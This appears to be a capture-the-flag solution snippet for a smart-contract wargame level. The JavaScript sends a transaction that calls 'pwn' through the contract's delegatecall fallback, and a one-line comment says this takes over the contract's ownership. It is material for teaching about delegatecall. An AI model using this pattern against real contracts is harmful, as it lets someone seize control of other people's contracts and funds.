```javascript
sendTransaction({ 
	from : player, 
	to : contract.address, 
	data : web3.eth.abi.encodeFunctionCall({
	    name: 'pwn',
	    type: 'function',
	    inputs: []
	}, [])
});
```

Delegate call the pwn function to change the contract's ownership.